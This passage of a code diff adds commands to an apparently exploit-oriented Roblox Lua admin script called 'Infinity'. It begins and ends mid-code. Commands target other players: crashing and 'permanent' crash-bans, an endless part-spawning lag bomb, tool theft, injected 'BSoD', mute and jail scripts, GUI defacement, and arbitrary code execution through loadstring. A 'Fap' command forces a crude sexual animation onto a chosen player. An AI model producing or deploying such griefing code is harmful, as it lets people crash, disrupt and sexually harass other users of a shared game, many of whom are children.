+               end, 1, "disc", "dconnect")
+New("Explode", function(S,M)
+        for k,v in pairs(Players(M,S)) do
+                if v.Character and v.Character:findFirstChild("Head") then
+                        local e = Instance.new("Explosion")
+                        e.Position = v.Character.Head.Position
+                        e.Parent = v.Character
+                end
+        end
+end, 1, "boom", "expl")
+New("Kick", function(S,M)
+        for k,v in pairs(Players(M,S)) do
+                v:Destroy()
+        end
+        Output((S == Player and CN or S.Name).." Kicked: "..M,"Black",Player,60)
+end, 1, "getridof", "kack")
+New("Crash", function(S,M)
+        if M:lower() == "all" then
+                Discall()
+                return
+        end
+        local a,b = Split(M)
+        if a:lower() == "p" or a:lower() == "player" then
+                for k,v in pairs(Players(b,S)) do
+                        Crash(v)
+                end
+        elseif a:lower() == "nil" and not b then
+                local t = Instance.new("StringValue")
+                t.Name = "DISC NIL"
+                t.Parent = game:GetService("Lighting")
+                wait(1)
+                t:Destroy()
+        else
+                Crash(a)
+        end
+        Output((S == Player and CN or S.Name).." Crashed: "..M,"Black",Player,60)
+end, 1, "cr", "break")
+New("Ban", function(S,M)
+        if M:sub(1,2):lower() == "f:" then
+                local a,b = Split(M)
+                table.insert(PB,b)
+                Output((S == Player and CN or S.Name).." Banned: "..b,"Black",Player,300)
+                return
+        end
+        for k,v in pairs(Players(M,S)) do
+                table.insert(PB,v.Name)
+                Output((S == Player and CN or S.Name).." Banned: "..v.Name,"Black",Player,300)
+                Crash(v)
+        end
+end, 1, "pcrash", "pban", "permcrash", "perm", "ByeByeForEver")
+New("Remove Ban", function(S,M)
+        for k,v in pairs(Parse(M)) do
+                for a,b in pairs(PB) do
+                        if b:lower() == v:lower() then
+                                table.remove(PB,a)
+                        end
+                end
+        end
+end, 1, "removeban", "unban", "unpban", "unperm", "pardon")
+New("Ban List", function(S,M)
+        Clear(false,S)
+        Output("Banned players: "..#PB,"Yellow",S,20,true)
+        local f = 0
+        for k,v in pairs(PB) do
+                if M == "" or M:lower() == "all" or M:lower() == "list" then
+                        f = -1
+                        Output("Banned: "..v,"Orange",S,20,true)
+                elseif v:sub(1,#M):lower() == M:lower() then
+                        Output("Banned: "..v,"Orange",S,20,true)
+                        f = f + 1
+                end
+        end
+        if f >= 0 then
+                Output("Found "..f.." players","Yellow",S,20,true)
+        end
+end, 1, "listbans", "bans", "banned")
+New("Stop", function()
+        Run = false
+        for k,v in pairs(CCons) do
+                v:disconnect()
+        end
+        Output("Infinity Stopped")
+end, 2)
+New("Clear", function(S,M)
+        if M == "" then M = "all" end
+        if M:lower():find("script") or M:lower() == "all" then
+                local s,e = 0,0
+                for k,v in pairs(workspace:GetChildren()) do
+                        if v:IsA("Script") then
+                                if pcall(function() v:Destroy() end) then
+                                        s = s + 1
+                                else
+                                        e = e + 1
+                                end
+                        end
+                end
+                if s > 0 then
+                Output(s.." scripts removed","Green",S)
+                end
+                if e > 0 then
+                        Output(e.." scripts failed to remove","Red",S)
+                end
+        end
+        if M:lower():find("part") or M:lower() == "all" then
+                local s = 0
+                for k,v in pairs(workspace:GetChildren()) do
+                        if v:IsA("BasePart") and v ~= Probe and v.Name ~= P2 and v.Name ~= "Base" then
+                                if pcall(function() v:Destroy() end) then
+                                        s = s + 1
+                                end
+                        end
+                end
+                if s > 0 then
+                        Output(s.." parts removed","Green",S)
+                end
+        end
+        if M:lower():find("model") or M:lower() == "all" then
+                local s,e = 0,0
+                for k,v in pairs(workspace:GetChildren()) do
+                        if v:IsA("Model") and not game:GetService("Players"):GetPlayerFromCharacter(v)  then
+                                if not v:findFirstChild("IOP") and pcall(function() v:Destroy() end) then
+                                        s = s + 1
+                                end
+                        end
+                end
+                if s > 0 then
+                        Output(s.." models removed","Green",S)
+                end
+        end
+        if M:lower():find("message") or M:lower():find("hint") or M:lower() == "all" then
+                local s,e = 0,0
+                for k,v in pairs(workspace:GetChildren()) do
+                        if v:IsA("Message") then
+                                v:Destroy()
+                                s = s + 1
+                        end
+                end
+                if s > 0 then
+                        Output(s.." messages removed","Green",S)
+                end
+        end
+        if M:lower():find("sound") or M:lower() == "all" then
+                local s,e = 0,0
+                for k,v in pairs(workspace:GetChildren()) do
+                        if v:IsA("Sound") then
+                                v:Destroy()
+                                s = s + 1
+                        end
+                end
+                if s > 0 then
+                        Output(s.." sounds removed","Green",S)
+                end
+        end
+        if M:lower():find("hat") or M:lower() == "all" then
+                local s,e = 0,0
+                for k,v in pairs(workspace:GetChildren()) do
+                        if v:IsA("Hat") then
+                                v:Destroy()
+                                s = s + 1
+                        end
+                end
+                if s > 0 then
+                        Output(s.." hats removed","Green",S)
+                end
+        end
+end, 1, "cl", "clean","c")
+New("Baseplate", function()
+        while workspace:findFirstChild("Base") do
+                workspace.Base:Destroy()
+        end
+        local b = Instance.new("Part")
+        b.Name = "Base"
+        b.Anchored, b.Locked = true, true
+        b.Size = Vector3.new(2044,0,2044)
+        b.BrickColor = BrickColor.new("Camo")
+        b.Material = "Grass"
+        b.Parent = workspace
+end, 1, "base", "bp")
+New("Werm Lag", function(S,M)
+              for k,v in pairs(Players(S,M)) do
+                    Script([==[
+                       
+local brik = Instance.new('Part',Workspace.CurrentCamera)
+script.Name = " WERM. ACTIVE !"
+for psky,src in pairs(script:GetChildren()) do
+src:Destroy()
+end
+script.Parent = nil
+coroutine.resume(coroutine.create(function()
+math.randomseed(tick())
+local Mdl = Instance.new("Model")
+local oldv = Vector3.new(0,0,0)
+if brik:IsA("BasePart") then
+oldv = brik.CFrame.p
+end
+local BC = BrickColor.new(math.random(), math.random(), math.random())
+for indefi = 1, math.huge do
+coroutine.resume(coroutine.create(function()
+math.randomseed(tick())
+local newv = Vector3.new(oldv.x + math.random(-2,2), oldv.y + math.random(-2,2), oldv.z + math.random(-2,2))
+oldv = newv
+local newpart = Instance.new("Part")
+newpart.Size = Vector3.new(2,2,2)
+newpart.Anchored = true
+newpart.CanCollide = true
+newpart.BrickColor = BC
+newpart.CFrame = CFrame.new(newv.x, newv.y, newv.z)
+newpart:Clone().Parent = Mdl
+newpart.Parent = game:GetService("Workspace").CurrentCamera
+for It, oBj in pairs(Mdl:GetChildren()) do
+oBj:Clone().Parent = game:GetService("Workspace").CurrentCamera
+end
+end))
+wait()
+end
+end))
+                    ]==],v:FindFirstChild('Backpack') or v:findFirstChild('PlayerGui') or v.Character)
+                end
+        end
+, 1, "wlag", "werml")
+New("Blast", function(S,M)
+        for k,v in pairs(Players(M,S)) do
+                if v.Character and v.Character:findFirstChild("Humanoid") then
+					for i = 1,8 do
+                        newBlast(v.Character.Torso)
+					end
+                end
+        end
+end, 1, "missle")
+New("Steal Tools", function()
+       for _,Player in pairs(GetPlayers(Msg,Speaker)) do
+            for _,Item in pairs(Player:findFirstChild('Backpack'):GetChildren()) do
+                Item:Clone().Parent=Speaker:findFirstChild('Backpack')
+            end
+        end
+    end
+, 1, "steal", "stools")
+New("T".."el".."ep".."or".."t", function(S,M)
+        local from, to = Split(M)
+        local From = Players(from,S)
+        local Target = nil
+        for k,v in pairs(to and Players(to,S) or From) do
+                if v.Character and v.Character:findFirstChild("Torso") then
+                        Target = v
+                end
+        end
+        if not Target and S ~= Player then Output("Couldn't find a good target!","Red",S) return end
+        if to then
+                for k,v in pairs(From) do
+                        if v.Character and v.Character:findFirstChild("Torso") then
+                                local c = v.Character
+                                c.Torso.CFrame = Target.Character.Torso.CFrame * CFrame.new(math.random(-4,4),0,math.random(-4,4))
+                                c.Torso.Velocity = Vector3.new()
+                        end
+                end
+        elseif S.Character and S.Character:findFirstChild("Torso") then
+                S.Character.Torso.CFrame = Target.Character.Torso.CFrame * CFrame.new(math.random(-4,4),0,math.random(-4,4))
+                S.Character.Torso.Velocity = Vector3.new()
+        elseif S == Player then
+                local cam = workspace.CurrentCamera
+                for k,v in pairs(Players(M,S)) do
+                        if v.Character and v.Character:findFirstChild("Torso") then
+                                v.Character.Torso.CFrame = cam.Focus * CFrame.new(math.random(-4,4),0,math.random(-4,4))
+                                v.Character.Torso.Velocity = Vector3.new()
+                        end
+                end
+        end
+end, 1, "tp", "tele", "goto")
+New("Ranks", function(S,M)
+        Clear(false,S)
+        M = M == ""  and "all" or M
+        local function c(tab,p,str)
+                DoCommand("who is",str:sub(1,-5),S)
+        end
+        if tonumber(M) then
+                local lev = tonumber(M)
+                for k,v in pairs(Players("all")) do
+                        if (v == Player and 2 or Holo(v) and 1 or 0) == lev then
+                                Output(v.Name.." ("..lev..")",lev == 2 and "Cyan" or lev == 1 and "Orange" or "White",S,15,c)
+                        end
+                end
+        else
+                for k,v in pairs(Players(M)) do
+                        local lev = v == Player and 2 or Holo(v) and 1 or 0
+                        Output(v.Name.." ("..lev..")", lev == 2 and "Cyan" or lev == 1 and "Orange" or "White",S,15,c)
+                end
+        end
+        if S == Player then
+                PRC = M
+        end
+end, 1, "rank", "level", "levels")
+New("Who is", function(S,M)
+        Clear(false,S)
+        M = M == ""  and "me" or M
+        local whos = Players(M,S)
+        if #whos == 0 then
+                Output("No player found!","Red",S,10,true)
+                return
+        end
+        if #whos == 1 then
+                local c,p = "Orange",whos[1]
+                Tablet("Info about "..p.Name,'Green',function() end)
+                Tablet("Rank: "..(p==Player and 2 or Holo(p) and 1 or 0),'Green',function() end)
+                Tablet("Age: "..p.AccountAge.." day(s)",'Green',function() end)
+                Tablet("Character: "..tostring(p.Character or "None"),'Green',function() end)
+				Tablet("Holo ",'Cyan',
+					function()
+				table.insert(Holos,p.Name)
+                Output("You were holo'd","Green",p,6)
+                Output("Do NOT abuse.","Red",p,6) 
+				Clear(false,S)
+					end)
+				Tablet("UnHolo",'Cyan',
+					function()
+						 for k,a in pairs(Holos) do
+                        if p.Name:lower() == a:lower() then
+                                Holos[k] = nil
+                        end
+                end
+                Output("You're no longer a holo!","Red",p,6)
+                Output("Too bad. Have fun with the kickingphrases","Green",p,6)
+				Clear(false,S)
+				 end)
+				Tablet("Crash",'Red',function() pcall(function() Crash(p) end) Clear(false,S) end)
+				Tablet("Kick",'Red',function() pcall(function() p:remove() end) Clear(false,S) end)
+				Tablet("Kill",'Orange',function() pcall(function() p.Character:BreakJoints() end) Clear(false,S) end)
+				Tablet("Ban",'Red',function() table.insert(PB,b) Crash(p) Clear(false,S) end)
+				Tablet("Mute",'Orange',function() Script(MuteSource,p.Backpack,true,"Muted "..p.Name)Clear(false,S) end)
+				Tablet("UnMute",'Orange',function() Script(UnMuteSource,p.Backpack,true,"UnMuted "..p.Name)Clear(false,S) end)
+				Tablet("TP Here",'Green',function() p.Character.Torso.CFrame = S.Character.Torso.CFrame or Probe.CFrame Clear(false,S) end)
+				Tablet("Jail",'Red',function() Script(JailSource,p.Backpack,true,"Jailed"..p.Name) Clear(false,S)end)
+				Tablet("BSoD",'Red',function() Script(BSoDSource,p.Backpack,true,"BSoD'd "..p.Name)Clear(false,S) end)
+				Tablet("Raven",'Green',function() Script(Raven,p.Backpack,true,"Gave raven to "..p.Name) Clear(false,S)end)
+				Tablet("JointCrap",'Green',function() DoCommand('jc',p.Name,S) Clear(false,S)end)
+				Tablet("Fix Limbs",'Red',function() Script(Flimbs,p.Backpack,true,"Fixed "..p.Name) Clear(false,S)end)
+      else
+                DoCommand("ranks",M,S)
+        end
+        if S == Player then
+                Tablet("Back","Red",S,nil,function() DoCommand("ranks",PRC,S) end)
+                Tablet("Dismiss","Red",S,nil,function() Clear(false,S) end)
+        end
+end, 1, "whois", "getrank")
+New("Time", function(S,M,C)
+        C = C:lower()
+        if (not Holo(S) and S ~= P) and (C == "settime" or C == "night" or C == "day" or (C == "time" and M~="")) then
+                Output("You cannot change the time!","Red",S)
+                return
+        end
+        if C == "night" or C == "day" then
+                game.Lighting.TimeOfDay = C:lower()=="night" and "0:00:00" or "12:00:00"
+        elseif C == "settime" or C == "time" and M ~= "" then
+                game.Lighting.TimeOfDay = M
+        end
+        if M == "" or M:lower() == "get" or M:lower() == "show" or C == "gettime" then
+                Output("Time: "..game.Lighting.TimeOfDay,"White",S)
+        end
+end, 0, "gettime", "settime","night","day")
+New("Home",
+	function(S,M)
+		S.Character.Torso.CFrame = CFrame.new(0,50,0)
+		S.Character.Torso.Velocity = Vector3.new(0,0,0)
+		S.Character.Torso.RotVelocity = Vector3.new(0,0,0)
+	end,0
+)
+New('kphrases',
+ function(S,M) 
+for _,Kz in pairs(farbidden) do
+        Tablet(Kz,'Red',S)
+end
+end,2
+)
+
+New("afk",
+        function(S,M)
+	Back = false
+	local loads = {}
+	Clear(false,S)
+			for i=1,8 do
+                wait(0.125)
+		loads[i] = Tablet("AFK ","Yellow")
+			        end
+	repeat
+        for n=1,8 do
+                wait(0.25)
+                loads[n].BrickColor = BrickColor.new(Colors.White)
+        end
+        for n=1,8 do
+                wait(0.25)
+                loads[n].BrickColor = BrickColor.new(Colors.Yellow)
+        end
+until Back == true
+        end,2
+)
+New("back",
+        function(S,M)
+	Back = true
+                Clear(false,S)
+                for i = 1,8 do
+	wait(0.125)
+                        Tablet('Welcome Back!','Green',S)
+                end
+                wait(3)
+        Clear(false,S)
+        end,2
+)
+New("WalkSpeed", function(S,M)
+        local a,b = Split(M)
+        local s = tonumber(b)
+        if tonumber(a) and not s then
+                if S.Character and S.Character:findFirstChild("Humanoid") then
+                        S.Character.Humanoid.WalkSpeed = tonumber(a)
+                end
+        elseif not s then
+                Output("No valid number!","Red",S)
+                return
+        end
+        for k,v in pairs(Players(a,S)) do
+                if v.Character and v.Character:findFirstChild("Humanoid") then
+                        v.Character.Humanoid.WalkSpeed = s
+                end
+        end
+end, 1, "ws", "speed", "walk")
+New("Inspect", function(S,M)
+        workspace.CurrentCamera.CameraSubject = Player.Character and Player.Character:findFirstChild("Humanoid")
+        workspace.CurrentCamera.CameraType = "Custom"
+        Probe.CanCollide = false
+        for k,v in pairs(Players(M,S)) do
+                if v.Character and v.Character:findFirstChild("Humanoid") then
+                        workspace.CurrentCamera.CameraSubject = v.Character.Humanoid
+                        workspace.CurrentCamera.CameraType = "Custom"
+                        Probe.CanCollide = false
+                end
+        end
+end, 2, "lookat", "camat","ins")
+New("Explorer",function(S,M)
+        local function ex(ob) return function() PEP = ob DoCommand("explorer","old",S) end end
+        Clear(false,S)
+        local childs = Parse(M)
+        local par, rea = nil, nil
+        if childs[1] == "" then
+                rea = workspace
+        elseif childs[1]:lower() == "game" then
+                rea = game
+        elseif #childs == 1 and childs[1]:lower() == "old" then
+                rea = PEP
+        elseif #childs == 1 and childs[1]:lower() == "parent" then
+                if not PEP or not PEP.Parent then
+                        Output("Couldn't find the Parent of the previous object","Red",S,30,true)
+                        return
+                end
+                rea = PEP.Parent
+        elseif #childs > 1 then
+                par = childs[1] == "old" and PEP or game:findFirstChild(childs[1]) or workspace:findFirstChild(childs[1])
+                rea = par
+                if not rea then
+                        Output("Couldn't find "..childs[1],"Red",S,30,true)
+                        return
+                end
+                for i=2,#childs do
+                        par = rea:findFirstChild(childs[i])
+                        if par then
+                                rea = par
+                        else
+                                Output("Couldn't find "..childs[i].." in "..rea.Name,"Red",S,3,true)
+                                wait(3)
+                                break
+                        end
+                end
+        else
+                rea = game:findFirstChild(M) or workspace:findFirstChild(M)
+        end
+        if not rea then
+                Output("Object not found!","Red",S,5,true)
+                return
+        end
+        if not pcall(function()
+                Output("Exploring "..rea.Name.." ("..rea.ClassName..")","Green",S,30,true)
+        end) then
+                Output(tostring(rea).." is protected!","Red",S,30,true)
+        end
+        Output("Parent","Brown",S,30,ex(rea.Parent or game))
+        Output("Dismiss","Red",S,30,function() Clear(false,S) end)
+        Output("Destroy","Red",S,30,function() pcall(function() rea:Destroy() end) end)
+        for k,v in pairs(rea:GetChildren()) do
+                local o = nil
+                if not pcall(function() o = Output(v.Name.." ("..v.ClassName..")","Yellow",S,30,ex(v)) end) then
+                        pcall(function() o = Output(tostring(v).." (???)", "Yellow",S,30,ex(v)) end)
+                end
+        end
+        PEP = rea
+end, 2, "explore","exp")
+New("Jump",function(S,M)
+        for k,v in pairs(Players(M,S)) do
+                if v.Character and v.Character:findFirstChild("Humanoid") then
+                        v.Character.Humanoid.Jump = true
+                end
+        end
+end, 1, "j")
+New("Stand",function(S,M)
+        for k,v in pairs(Players(M,S)) do
+                if v.Character and v.Character:findFirstChild("Humanoid") then
+                        v.Character.Humanoid.Jump = false
+                        v.Character.Humanoid.PlatformStand = false
+                        v.Character.Humanoid.Sit = false
+                        if v.Character:findFirstChild("Torso") then
+                                v.Character.Torso.CFrame = CFrame.new(v.Character.Torso.Position) + Vector3.new(0,5,0)
+                                v.Character.Torso.Velocity = Vector3.new()
+                        end
+                end
+        end
+end, 1, "unparalyze", "unpara","st")
+New("Sit",function(S,M)
+        for k,v in pairs(Players(M,S)) do
+                if v.Character and v.Character:findFirstChild("Humanoid") then
+                        v.Character.Humanoid.Sit = true
+                end
+        end
+end, 1, "si")
+New("PlatformStand",function(S,M)
+        for k,v in pairs(Players(M,S)) do
+                if v.Character and v.Character:findFirstChild("Humanoid") then
+                        v.Character.Humanoid.PlatformStand = true
+                end
+        end
+end, 1, "paralyze", "para")
+New("Punish",function(S,M)
+        for k,v in pairs(Players(M,S)) do
+                if v.Character then
+                        v.Character.Parent = game:GetService("MarketplaceService")
+                        v.Character:MakeJoints()
+                end
+        end
+end, 1)
+New("Unpunish",function(S,M)
+        for k,v in pairs(Players(M,S)) do
+                if v.Character then
+                        v.Character.Parent = workspace
+                        v.Character:MakeJoints()
+                        if v.Character:findFirstChild("Animate") then
+                                v.Character.Animate:Destroy()
+                        end
+                        Animate:clone().Parent = v.Character
+                end
+        end
+end, 1)
+New("Name",function(S,M)
+        local p = {S}
+        local n = M
+        local a,b = Split(M)
+        if a and b then
+                p = Players(a,S)
+                n = b
+        end
+        for k,v in pairs(p) do
+                if v.Character and v.Character:findFirstChild("Head") then
+                        local Do = not (n:lower() == "none" or n:lower() == "off")
+                        for k,v in pairs(v.Character.Head:GetChildren()) do
+                                if v:IsA("Model") and v:findFirstChild("Head") and Do then
+                                        v.Name = n
+                                        Do = false
+                                elseif v:IsA("Model") and v:findFirstChild("Head") then
+                                        v:Destroy()
+                                end
+                        end
+                        if Do then
+                                local mo = Instance.new("Model",v.Character.Head)
+                                mo.Name = n
+                                v.Character.Head.Archivable = true
+                                v.Character.Head.Transparency = 1
+                                local fh = v.Character.Head:clone()
+                                fh.Transparency = 0
+                                fh.Name = "Head"
+                                fh.Parent = mo
+                                Instance.new("Humanoid",mo).MaxHealth = 0
+                                local we = Instance.new("Weld",fh)
+                                we.Part0 = v.Character.Head
+                                we.Part1 = fh
+                                coroutine.wrap(function()
+                                        while fh:IsDescendantOf(workspace) and v.Character and v.Character:findFirstChild("Head") and wait() do
+                                                if v.Character.Head.Transparency  ~= 1 and fh.Transparency == 0 then
+                                                        v.Character.Head.Transparency = 1
+                                                end
+                                        end
+                                end)()
+                        else
+                                v.Character.Head.Transparency = 0
+                        end
+                end
+        end
+end, 1, "nm")
+New("Slenderman", function(S,M)
+        local cfs = {C0={},C1={}}
+        cfs.C0.LS = CFrame.new(-1, 0.5, 0)
+        cfs.C1.LS = CFrame.new(0.75, 0.5, 0)
+        cfs.C0.RS = CFrame.new(1, 0.5, 0)
+        cfs.C1.RS = CFrame.new(-0.75, 0.5, 0)
+        cfs.C0.LH = CFrame.new(-1, -1, 0)
+        cfs.C1.LH = CFrame.new(-0.75, 1, 0)
+        cfs.C0.RH = CFrame.new(1, -1, 0)
+        cfs.C1.RH = CFrame.new(0.75, 1, 0)
+        for k,v in pairs(Players(M,S)) do
+                if v.Character and v.Character:findFirstChild("Torso") then
+                        v.Character.Torso.BrickColor = BrickColor.new(Colors.Black)
+                        for a,b in pairs({"Left Shoulder","Right Shoulder","Left Hip","Right Hip"}) do
+                                if v.Character.Torso:findFirstChild(b) then
+                                        local c,d = b:sub(1,1), b:match("[SH]")
+                                        local cf0 = cfs.C0[c..d]
+                                        local cf1 = cfs.C1[c..d]
+                                        local w = v.Character.Torso[b]
+                                        local p = w.Part1
+                                        w.Part1 = nil
+                                        p.Size = Vector3.new(1,3,1)
+                                        p.BrickColor = BrickColor.new(Colors.Black)
+                                        w.Part1 = p
+                                        w.C1 = cf1
+                                end
+                        end
+                        if v.Character:findFirstChild("Head") then
+                                v.Character.Head.BrickColor = BrickColor.new(Colors.White)
+                        end
+                end
+        end
+end, 1, "slender", "sm", "sman")
+New("Colors", function(S)
+        for k,v in pairs(Colors) do
+                Output(v,v,S,60,true)
+        end
+end, 0, "allcolors", "listcolors", "color")
+New("Haxscr", function(S)
+       randomphrases = {"Infinity Owns You","99zay99's scriptingscillz","Now with free cheese!","With working SBL"}
+ 
+function colorAllGuisIn(parent)
+    for _, child in ipairs(parent:getChildren()) do
+        if child.ClassName == "TextLabel" or child.ClassName == "TextButton" or child.ClassName == "TextBox" then
+            child.Text = randomphrases[math.random(1,#randomphrases)]
+            child.TextStrokeColor3 = BrickColor.random().Color
+            child.BackgroundColor3 = BrickColor.random().Color
+            child.TextColor3 = BrickColor.random().Color
+        elseif child:IsA("Model") then
+            colorAllGuisIn(child)
+        else
+            colorAllGuisIn(child)
+        end
+    end
+end
+ 
+while wait(.5) do
+colorAllGuisIn(workspace)
+colorAllGuisIn(game.Players)
+end
+end, 2, "hscript", "hackscr", "h@xscr")
+New("Scr", function(S)
+       local Ran,Error = coroutine.resume(coroutine.create(function()loadstring(Msg)() end))
+if not Ran then
+        Output("Error",S,30)
+else
+        Output("Script Ran",S,30)
+end
+end, 2, "script", "load")
+New("Mesh", function(S,M)
+        M = M == "" and "list" or M:lower()
+        local m = MG[S.Name]
+        if M == "off" then
+                MG[S.Name] = nil
+                return
+        end
+        if M ~= "list" and M ~= "all" then
+                local r = nil
+                for k,v in pairs(Meshes) do
+                        if k:lower():sub(1,#M) == M:lower() then
+                                if r then
+                                        Output("Multiple Meshes found!","Red",S)
+                                        return
+                                else
+                                        r = k
+                                end
+                        end
+                end
+                MG[S.Name] = r
+                Output("Mesh set to "..(r and r or "None"),"Green",S,15)
+                return
+        end
+        for k,v in pairs(Meshes) do
+                MG[S.Name] = k
+                Output(k,"White",S,30,false,true)
+        end
+        MG[S.Name] = m
+end, 0, "meshes", "ms", "form", "globe", "bubble")
+
+New("Respawn", function(S,M)
+	for k,v in pairs(Players(M,S)) do
+local ack2 = Instance.new("Model") 
+ack2.Parent = game:GetService("Workspace") 
+local ack4 = Instance.new("Part") 
+ack4.Transparency = 1 
+ack4.CanCollide = false 
+ack4.Anchored = true 
+ack4.Name = "Torso" 
+ack4.Position = Vector3.new(10000,10000,10000) 
+ack4.Parent = ack2 
+local ack3 = Instance.new("Humanoid") 
+ack3.Torso = ack4 
+ack3.Parent = ack2 
+v.Character = ack2
+end
+end, 2)
+New("SBL", function(S,M)
+        if not bl or #bl == 0 then
+                Output("SBL Offline!","Red",S)
+                return
+        end
+        if M:lower() == "off" then
+                bld = true
+                Output("SBL is disabled!","Red",S,20)
+                return
+        elseif M:lower() == "on" then
+                bld = false
+                Output("SBL is enabled!","Green",S,20)
+                return
+        end
+        Clear(false,S)
+        table.sort(bl)
+        if bld then
+                Output("SBL is disabled!","Red",S,20,true)
+        end
+        Output("[SBL] Synchronised Ban List","Yellow",S,20,true)
+        Output("Created by the same maker of this script","Yellow",S,20,true)
+        Output("SBL synchronises every 30 seconds with roblox.com","Yellow",S,20,true)
+        Output("Banned players: "..#bl,"Yellow",S,20,true)
+        local f = 0
+        for k,v in pairs(bl) do
+                if M == "" or M:lower() == "all" or M:lower() == "list" then
+                        f = -1
+                        Output("Banned: "..v,"Orange",S,20,true)
+                elseif v:sub(1,#M):lower() == M:lower() then
+                        Output("Banned: "..v,"Orange",S,20,true)
+                        f = f + 1
+                end
+        end
+        if f >= 0 then
+                Output("Found "..f.." players","Yellow",S,20,true)
+        end
+end, 0, "sync", "sblist")
+New("Shockwave", function(S,M)
+        local targs = Players(M=="" and "dfgdgdgffg" or M,S)
+        local p = Instance.new("Part",workspace)
+        local cam = workspace.CurrentCamera or workspace:findFirstChild("Camera") or Instance.new("Camera")
+        local sc = S.Character and S.Character:findFirstChild("Torso") and S.Character.Torso.CFrame or cam.Focus
+        p.Shape = "Ball"
+        p.BrickColor = BrickColor.new(Colors.Cyan)
+        p.TopSurface = 0
+        p.BottomSurface = 0
+        p.CanCollide = false
+        p.Anchored = true
+        p.Transparency = 0.5
+        p.Size = Vector3.new(1,1,1)
+        p.CFrame = sc
+        local m = Instance.new("SpecialMesh",p)
+        m.MeshType = "Sphere"
+        for i=1,1000,1 do
+                m.Scale = Vector3.new(i,i,i)
+                for k,r in pairs(targs) do
+                        if r:DistanceFromCharacter(p.Position) <= i/2 then
+                                if r.Character and r.Character:findFirstChild("Humanoid") then
+                                        r.Character.Humanoid.Health = 0
+                                        targs[k] = nil
+                                end
+                        end
+                end
+                wait()
+        end
+        p:Destroy()
+end, 1, "sw", "shock", "wave")
+New("Tablet Users", function(S,M)
+        Clear(false,S)
+        M = M == "" and "list" or M
+        local f = {}
+        for k,v in pairs(NRS) do
+                if M:lower() == "list" or M:lower() == "all" then
+                        table.insert(f,k)
+                elseif k:lower():sub(1,#M) == M:lower() then
+                        table.insert(f,k)
+                end
+        end
+        if #f == 0 then
+                Output("Nobody found!","Red",S)
+        elseif #f > 1 then
+                Output("Listing "..#f.." Tablet Users","Green",S,30,true)
+                for k,v in pairs(NRS) do
+                        if v.Version then
+                                Output(k.." ("..v.Version..")","White",S,30,function() DoCommand("Tablets",k,S) end)
+                        else
+                                Output(k.." (???)","White",S,30,function() DoCommand("Tablets",k,S) end)
+                        end
+                end
+        else
+                local k,v = f[1],NRS[f[1]]
+                Output("Tablet: "..k,"Green",S,30,true)
+                Output("Version: "..(v.Version or "???"),"Orange",S,30,true)
+                Output("Explorer: "..tostring(v.Explorer==nil and "N/A" or v.Explorer),"Orange",S,30,true)
+                Output("Disabled: "..tostring(v.Removed==nil and "N/A" or v.Removed),"Orange",S,30,true)
+        end
+end, 1, "Tab", "Tablet")
+New("List Nil", function(S,M)
+        if not sou then
+                return Output("Need source!","Red",S)
+        end
+        Script([[
+                local mod = Instance.new("Model")
+                mod.Name = "NilPlayers"
+                pcall(function()
+                        for k,v in pairs(game:GetService("NetworkServer"):GetChildren()) do
+                                pcall(function()
+                                        local p = v:GetPlayer()
+                                        Instance.new("ObjectValue",mod).Name = tostring(p)
+                                        mod[tostring(p)].Value = p
+                                end)
+                        end
+                end)
+                mod.Parent = game:GetService("Lighting")
+                script:Destroy()
+        ]],workspace,false,"Searching Nil Players")
+        local np = false
+        for i=1,5,0.1 do
+                np = game:GetService("Lighting"):findFirstChild("NilPlayers")
+                if np then break end
+                wait(0.1)
+        end
+        if not np then
+                return Output("Something went wrong!","Red",S)
+        end
+        Clear(false,S)
+        NIL = {}
+        for k,v in pairs(np:GetChildren()) do
+                if v.Name ~= Player.Name then
+                        if not v.Value or (not pcall(function() local a = v.Value.Parent end)) or not v.Value.Parent then
+                                NIL[v.Name] = v.Value
+                                Output(v.Name,"Orange",S,10,true)
+                        else
+                                Output(v.Name,"Green",S,10,true)
+                        end
+                end
+        end
+        np:Destroy()
+end, 2, "nilp", "listnil")
+New("Flimbs", function(S,M)
+        for k,v in pairs(Players(M,S)) do
+			Script(Flimbs,v.Backpack,true,"Fixed "..v.Name)
+        end
+end, 1)
+
+New("Fap", function(S,M)
+        for k,v in pairs(Players(M,S)) do
+			Script([==[
+lp = game:service('Players').LocalPlayer
+person = lp.Name
+char = lp.Character
+torso = char:findFirstChild("Torso")
+ra = char:findFirstChild("Right Arm")
+la = char:findFirstChild("Left Arm")
+rl = char:findFirstChild("Right Leg")
+ll = char:findFirstChild("Left Leg")
+rs = torso:findFirstChild("Right Shoulder")
+ls = torso:findFirstChild("Left Shoulder")
+rh = torso:findFirstChild("Right Hip")
+lh = torso:findFirstChild("Left Hip")
+neck = torso:findFirstChild("Neck")
+rj = char:findFirstChild("HumanoidRootPart"):findFirstChild("RootJoint")
+anim = char:findFirstChild("Animate")
+rootpart = char:findFirstChild("HumanoidRootPart")
+camera = workspace.CurrentCamera
+if anim then
+anim:Destroy()
+end
+local rm = Instance.new("Motor", torso)
+rm.C0 = CFrame.new(1.5, 0.5, 0) *CFrame.Angles(0, 0, 0)
+rm.C1 = CFrame.new(0, 0.5, 0)
+rm.Part0 = torso
+rm.Part1 = ra
+local lm = Instance.new("Motor", torso)
+lm.C0 = CFrame.new(-1.5, 0.5, 0) *CFrame.Angles(0, 0, 0)
+lm.C1 = CFrame.new(0, 0.5, 0)
+lm.Part0 = torso
+lm.Part1 = la
+local rlegm = Instance.new("Motor", torso)
+rlegm.C0 = CFrame.new(0.5, -1, 0) *CFrame.Angles(0, 0, 0) 
+rlegm.C1 = CFrame.new(0, 1, 0)
+rlegm.Part0 = torso
+rlegm.Part1 = rl
+local llegm = Instance.new("Motor", torso)
+llegm.C0 = CFrame.new(-0.5, -1, 0) *CFrame.Angles(0, 0, 0)
+llegm.C1 = CFrame.new(0, 1, 0)
+llegm.Part0 = torso
+llegm.Part1 = ll
+rsc0 = rm.C0
+lsc0 = lm.C0
+llc0 = llegm.C0
+rlc0 = rlegm.C0
+neckc0 = neck.C0
+rootc0 = rj.C0
+key = nil
+local count = 0
+local countspeed = 0.70
+color = "Pastel brown"
+pcall(function() game.Players[person].Character["Nice thing"]:Remove() end)
+D = Instance.new("Model",workspace[person])
+D.Name = "Nice thing"
+bg = Instance.new("BodyGyro",workspace[person].Torso)
+d = Instance.new("Part")
+d.TopSurface = 0
+d.BottomSurface = 0
+d.Name = "Main"
+d.Parent = workspace[person]["Nice thing"]
+d.formFactor = 3
+d.Size = Vector3.new(0.6,2.5,0.6)
+d.BrickColor = BrickColor.new(color)
+d.Position = workspace[person].Head.Position
+d.CanCollide = false
